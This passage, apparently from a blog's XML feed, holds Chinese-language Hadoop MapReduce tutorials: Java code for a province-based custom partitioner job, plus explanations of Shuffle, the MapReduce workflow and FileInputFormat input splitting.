class="number">4</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 最后返回分区号 partition</span></span><br><span class="line">        <span class="keyword">return</span> partition;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）在驱动函数中增加自定义数据分区设置和-ReduceTask-设置"><a href="#（2）在驱动函数中增加自定义数据分区设置和-ReduceTask-设置" class="headerlink" title="（2）在驱动函数中增加自定义数据分区设置和 ReduceTask 设置"></a>（2）在驱动函数中增加自定义数据分区设置和 ReduceTask 设置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定自定义分区</span></span><br><span class="line">job.setPartitionerClass(ProvincePartitioner.class);</span><br><span class="line"><span class="comment">// 同时指定相应数量的 ReduceTask</span></span><br><span class="line">job.setNumReduceTasks(<span class="number">5</span>);</span><br></pre></td></tr></table></figure><h3 id="（3）驱动器类"><a href="#（3）驱动器类" class="headerlink" title="（3）驱动器类"></a>（3）驱动器类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.partition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 22:14 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowDriver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, InterruptedException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.获取job对象</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Configuration</span> <span class="variable">configuration</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Configuration</span>();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Job</span> <span class="variable">job</span> <span class="operator">=</span> Job.getInstance();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.关联 driver mapper reducer</span></span><br><span class="line">        job.setJarByClass(FlowDriver.class);</span><br><span class="line">        job.setMapperClass(FlowMapper.class);</span><br><span class="line">        job.setReducerClass(FlowReducer.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.设置 map 端输出 KV 类型</span></span><br><span class="line">        job.setMapOutputKeyClass(Text.class);</span><br><span class="line">        job.setMapOutputValueClass(FlowBean.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.设置程序最终输出 KV 类型</span></span><br><span class="line">        job.setOutputKeyClass(Text.class);</span><br><span class="line">        job.setOutputValueClass(FlowBean.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 指定自定义分区</span></span><br><span class="line">        job.setPartitionerClass(ProvincePartitioner.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 同时指定相应数量的 ReduceTask</span></span><br><span class="line">        job.setNumReduceTasks(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.设置程序输入输出路径</span></span><br><span class="line">        FileInputFormat.setInputPaths(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\phone_data.txt&quot;</span>));</span><br><span class="line">        FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> <span class="title class_">Path</span>(<span class="string">&quot;Y:\\Temp\\output1234\\&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6.提交job</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> job.waitForCompletion(<span class="literal">true</span>);</span><br><span class="line">        System.exit(b ? <span class="number">0</span> : <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（4）Mapper-类"><a href="#（4）Mapper-类" class="headerlink" title="（4）Mapper 类"></a>（4）Mapper 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.partition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.LongWritable;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 21:59 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowMapper</span> <span class="keyword">extends</span> <span class="title class_">Mapper</span>&lt;LongWritable, Text, Text, FlowBean&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">Text</span> <span class="variable">outK</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Text</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">FlowBean</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FlowBean</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">map</span><span class="params">(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, FlowBean&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.获取一行数据</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> value.toString();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.切割数据</span></span><br><span class="line">        <span class="keyword">final</span> String[] split = line.split(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.抓取手机号、上行流量、下行流量</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">phone</span> <span class="operator">=</span> split[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">upFlow</span> <span class="operator">=</span> split[split.length - <span class="number">3</span>];</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">downFlow</span> <span class="operator">=</span> split[split.length - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4.封装 outK outV</span></span><br><span class="line">        outK.set(phone);</span><br><span class="line">        outV.setUpFlow(Long.parseLong(upFlow));</span><br><span class="line">        outV.setDownFlow(Long.parseLong(downFlow));</span><br><span class="line">        outV.setSumFlow();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.写出 outK outV</span></span><br><span class="line">        context.write(outK, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（5）Reducer-类"><a href="#（5）Reducer-类" class="headerlink" title="（5）Reducer 类"></a>（5）Reducer 类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.partition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 22:07 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowReducer</span> <span class="keyword">extends</span> <span class="title class_">Reducer</span>&lt;Text, FlowBean, Text, FlowBean&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">FlowBean</span> <span class="variable">outV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FlowBean</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">reduce</span><span class="params">(Text key, Iterable&lt;FlowBean&gt; values, Reducer&lt;Text, FlowBean, Text, FlowBean&gt;.Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">totalUpFlow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="variable">totalDownFlow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1.遍历values,将其中的上行流量和下行流量分别累计</span></span><br><span class="line">        <span class="keyword">for</span> (FlowBean value : values) &#123;</span><br><span class="line">            totalUpFlow += value.getUpFlow();</span><br><span class="line">            totalDownFlow += value.getDownFlow();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2.封装 outKV</span></span><br><span class="line">        outV.setUpFlow(totalUpFlow);</span><br><span class="line">        outV.setDownFlow(totalDownFlow);</span><br><span class="line">        outV.setSumFlow();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3.写出 outK outV</span></span><br><span class="line">        context.write(key, outV);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（6）实体类"><a href="#（6）实体类" class="headerlink" title="（6）实体类"></a>（6）实体类</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.aiyingke.mapreduce.partition;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.Setter;</span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Writable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.DataInput;</span><br><span class="line"><span class="keyword">import</span> java.io.DataOutput;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 21:40 2022/12/17</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Setter</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlowBean</span> <span class="keyword">implements</span> <span class="title class_">Writable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> upFlow;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> downFlow;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> sumFlow;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">FlowBean</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSumFlow</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sumFlow = <span class="built_in">this</span>.upFlow + <span class="built_in">this</span>.downFlow;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(DataOutput dataOutput)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        dataOutput.writeLong(upFlow);</span><br><span class="line">        dataOutput.writeLong(downFlow);</span><br><span class="line">        dataOutput.writeLong(sumFlow);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readFields</span><span class="params">(DataInput dataInput)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.upFlow = dataInput.readLong();</span><br><span class="line">        <span class="built_in">this</span>.downFlow = dataInput.readLong();</span><br><span class="line">        <span class="built_in">this</span>.sumFlow = dataInput.readLong();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> upFlow + <span class="string">&quot;\t&quot;</span> + downFlow + <span class="string">&quot;\t&quot;</span> + sumFlow;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce Shuffle机制</title>
      <link href="/blog/6b6718d7.html/"/>
      <url>/blog/6b6718d7.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Shuffle-机制"><a href="#一：Shuffle-机制" class="headerlink" title="一：Shuffle 机制"></a>一：Shuffle 机制</h1><ul><li>Map 方法之后，Reduce 方法之前的数据处理过程称之为 Shuffle。</li></ul><p><img src="/blog/6b6718d7.html/image-20221218165425041.png"></p>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce 工作流程</title>
      <link href="/blog/d1b2c594.html/"/>
      <url>/blog/d1b2c594.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：MapReduce详细工作流程图"><a href="#一：MapReduce详细工作流程图" class="headerlink" title="一：MapReduce详细工作流程图"></a>一：MapReduce详细工作流程图</h1><p><img src="/blog/d1b2c594.html/image-20221218153651886.png"></p><p><img src="/blog/d1b2c594.html/image-20221218154214498.png"></p><p>上面的流程是整个 MapReduce 最全工作流程，但是 Shuffle 过程只是从第 7 步开始到第 16 步结束，具体 Shuffle 过程详解，如下：</p><p>（1）MapTask 收集我们的 map()方法输出的 kv 对，放到内存缓冲区中</p><p>（2）从内存缓冲区不断溢出本地磁盘文件，可能会溢出多个文件</p><p>（3）多个溢出文件会被合并成大的溢出文件</p><p>（4）在溢出过程及合并的过程中，都要调用 Partitioner 进行分区和针对 key 进行排序</p><p>（5）ReduceTask 根据自己的分区号，去各个 MapTask 机器上取相应的结果分区数据</p><p>（6）ReduceTask 会抓取到同一个分区的来自不同 MapTask 的结果文件，ReduceTask 会将这些文件再进行合并（归并排序）</p><p>（7）合并成大文件后，Shuffle 的过程也就结束了，后面进入 ReduceTask 的逻辑运算过程（从文件中取出一个一个的键值对 Group，调用用户自定义的 reduce()方法）</p><p><strong>注意：</strong> </p><ul><li>（1）Shuffle 中的缓冲区大小会影响到 MapReduce 程序的执行效率，原则上说，缓冲区 越大，磁盘 io 的次数越少，执行速度就越快。 </li><li>（2）缓冲区的大小可以通过参数调整，参数：mapreduce.task.io.sort.mb 默认 100M。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Hadoop </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MapReduce 切片原理</title>
      <link href="/blog/f5d61b06.html/"/>
      <url>/blog/f5d61b06.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：MapReduce-框架原理"><a href="#一：MapReduce-框架原理" class="headerlink" title="一：MapReduce 框架原理"></a>一：MapReduce 框架原理</h1><p><img src="/blog/f5d61b06.html/image-20221218140443270.png"></p><h1 id="二：切片与-MapTask-并行度决定机制"><a href="#二：切片与-MapTask-并行度决定机制" class="headerlink" title="二：切片与 MapTask 并行度决定机制"></a>二：切片与 MapTask 并行度决定机制</h1><h2 id="2-1-问题引出"><a href="#2-1-问题引出" class="headerlink" title="2.1 问题引出"></a>2.1 问题引出</h2><ul><li>MapTask 的并行度决定 Map 阶段的任务处理并发度，进而影响到整个 Job 的处理速度。</li><li>1G 的数据，启动 8 个 MapTask，可以提高集群的并发处理能力。那么 1K 的数 据，也启动 8 个 MapTask，会提高集群性能吗？MapTask 并行任务是否越多越好呢？哪些因 素影响了 MapTask 并行度？</li></ul><h2 id="2-2-MapTask-并行度决定机制"><a href="#2-2-MapTask-并行度决定机制" class="headerlink" title="2.2 MapTask 并行度决定机制"></a>2.2 MapTask 并行度决定机制</h2><ul><li>数据块：Block 是 HDFS 物理上把数据分成一块一块。数据块是 HDFS 存储数据单位。</li><li>数据切片：数据切片只是在逻辑上对输入进行分片，并不会在磁盘上将其切分成片进行 存储。数据切片是 MapReduce 程序计算输入数据的单位，一个切片会对应启动一个 MapTask。</li></ul><h2 id="2-3-数据切片与MapTask并行度决定机制"><a href="#2-3-数据切片与MapTask并行度决定机制" class="headerlink" title="2.3 数据切片与MapTask并行度决定机制"></a>2.3 数据切片与MapTask并行度决定机制</h2><p><img src="/blog/f5d61b06.html/image-20221218140847097.png"></p><h1 id="三：Job-提交流程源码和切片源码详解"><a href="#三：Job-提交流程源码和切片源码详解" class="headerlink" title="三：Job 提交流程源码和切片源码详解"></a>三：Job 提交流程源码和切片源码详解</h1><h2 id="3-1-Job-提交流程源码详解"><a href="#3-1-Job-提交流程源码详解" class="headerlink" title="3.1 Job 提交流程源码详解"></a>3.1 Job 提交流程源码详解</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">waitForCompletion()</span><br><span class="line">submit();</span><br><span class="line"><span class="comment">// 1 建立连接</span></span><br><span class="line">connect();</span><br><span class="line"><span class="comment">// 1）创建提交 Job 的代理</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Cluster</span>(getConfiguration());</span><br><span class="line"><span class="comment">// （1）判断是本地运行环境还是 yarn 集群运行环境</span></span><br><span class="line">initialize(jobTrackAddr, conf); </span><br><span class="line"><span class="comment">// 2 提交 job</span></span><br><span class="line">submitter.submitJobInternal(Job.<span class="built_in">this</span>, cluster)</span><br><span class="line"><span class="comment">// 1）创建给集群提交数据的 Stag 路径</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">jobStagingArea</span> <span class="operator">=</span> JobSubmissionFiles.getStagingDir(cluster, conf);</span><br><span class="line"><span class="comment">// 2）获取 jobid ，并创建 Job 路径</span></span><br><span class="line"><span class="type">JobID</span> <span class="variable">jobId</span> <span class="operator">=</span> submitClient.getNewJobID();</span><br><span class="line"><span class="comment">// 3）拷贝 jar 包到集群</span></span><br><span class="line">copyAndConfigureFiles(job, submitJobDir);</span><br><span class="line">rUploader.uploadFiles(job, jobSubmitDir);</span><br><span class="line"><span class="comment">// 4）计算切片，生成切片规划文件</span></span><br><span class="line">writeSplits(job, submitJobDir);</span><br><span class="line">maps = writeNewSplits(job, jobSubmitDir);</span><br><span class="line">input.getSplits(job);</span><br><span class="line"><span class="comment">// 5）向 Stag 路径写 XML 配置文件</span></span><br><span class="line">writeConf(conf, submitJobFile);</span><br><span class="line">conf.writeXml(out);</span><br><span class="line"><span class="comment">// 6）提交 Job,返回提交状态</span></span><br><span class="line">status = submitClient.submitJob(jobId, submitJobDir.toString(),</span><br><span class="line">waitForCompletion()</span><br><span class="line">submit();</span><br><span class="line"><span class="comment">// 1 建立连接</span></span><br><span class="line">connect();</span><br><span class="line"><span class="comment">// 1）创建提交 Job 的代理</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Cluster</span>(getConfiguration());</span><br><span class="line"><span class="comment">// （1）判断是本地运行环境还是 yarn 集群运行环境</span></span><br><span class="line">initialize(jobTrackAddr, conf); </span><br><span class="line"><span class="comment">// 2 提交 job</span></span><br><span class="line">submitter.submitJobInternal(Job.<span class="built_in">this</span>, cluster)</span><br><span class="line"><span class="comment">// 1）创建给集群提交数据的 Stag 路径</span></span><br><span class="line"><span class="type">Path</span> <span class="variable">jobStagingArea</span> <span class="operator">=</span> JobSubmissionFiles.getStagingDir(cluster, conf);</span><br><span class="line"><span class="comment">// 2）获取 jobid ，并创建 Job 路径</span></span><br><span class="line"><span class="type">JobID</span> <span class="variable">jobId</span> <span class="operator">=</span> submitClient.getNewJobID();</span><br><span class="line"><span class="comment">// 3）拷贝 jar 包到集群</span></span><br><span class="line">copyAndConfigureFiles(job, submitJobDir);</span><br><span class="line">rUploader.uploadFiles(job, jobSubmitDir);</span><br><span class="line"><span class="comment">// 4）计算切片，生成切片规划文件</span></span><br><span class="line">writeSplits(job, submitJobDir);</span><br><span class="line">maps = writeNewSplits(job, jobSubmitDir);</span><br><span class="line">input.getSplits(job);</span><br><span class="line"><span class="comment">// 5）向 Stag 路径写 XML 配置文件</span></span><br><span class="line">writeConf(conf, submitJobFile);</span><br><span class="line">conf.writeXml(out);</span><br><span class="line"><span class="comment">// 6）提交 Job,返回提交状态</span></span><br><span class="line">status = submitClient.submitJob(jobId, submitJobDir.toString(),</span><br></pre></td></tr></table></figure><h2 id="3-2-Job提交流程源码解析"><a href="#3-2-Job提交流程源码解析" class="headerlink" title="3.2 Job提交流程源码解析"></a>3.2 Job提交流程源码解析</h2><p><img src="/blog/f5d61b06.html/image-20221218141342346.png"></p><h2 id="3-3-FileInputFormat-切片源码解析（input-getSplits-job-）"><a href="#3-3-FileInputFormat-切片源码解析（input-getSplits-job-）" class="headerlink" title="3.3 FileInputFormat 切片源码解析（input.getSplits(job)）"></a>3.3 FileInputFormat 切片源码解析（input.getSplits(job)）</h2><ul><li>（1）程序先找到你数据存储的目录。</li><li>（2）开始遍历处理（规划切片）目录下的每一个文件 </li><li>（3）遍历第一个文件data1.txt <ul><li>a）获取文件大小fs.sizeOf(data.txt) </li><li>b）计算切片大小 computeSplitSize(Math.max(minSize,Math.min(maxSize,blocksize)))&#x3D;blocksize&#x3D;128M </li><li>c）默认情况下，切片大小&#x3D;blocksize </li><li>d）开始切，形成第1个切片：data.txt—0:128M 第2个切片data.txt—128:256M 第3个切片data.txt—256M:300M （每次切片时，都要判断切完剩下的部分是否大于块的1.1倍，不大于1.1倍就划分一块切片） </li><li>e）将切片信息写到一个切片规划文件中 </li><li>f）整个切片的核心过程在getSplit()方法中完成 </li><li>g）InputSplit只记录了切片的元数据信息，比如起始位置、长度以及所在的节点列表等。</li></ul></li><li>（4）提交切片规划文件到YARN上，YARN上的MrAppMaster就可以根据切片规划文件计算开启MapTask个数。</li></ul><h1 id="四：FileInputFormat-切片机制"><a href="#四：FileInputFormat-切片机制" class="headerlink" title="四：FileInputFormat 切片机制"></a>四：FileInputFormat 切片机制</h1><h2 id="4-1-FileInputFormat切片机制"><a href="#4-1-FileInputFormat切片机制" class="headerlink" title="4.1 FileInputFormat切片机制"></a>4.1 FileInputFormat切片机制</h2><p>（1）简单地按照文件的内容长度进行切片</p><p>（2）切片大小，默认等于Block大小</p><p>（3）切片时不考虑数据集整体，而是逐个针对每一个文件单独切片</p><h2 id="4-2-案例分析"><a href="#4-2-案例分析" class="headerlink" title="4.2 案例分析"></a>4.2 案例分析</h2><p>（1）输入数据有两个文件：</p><ul><li>file1.txt 320M </li><li>file2.txt 10M</li></ul><p>（2）经过FileInputFormat的切片机制 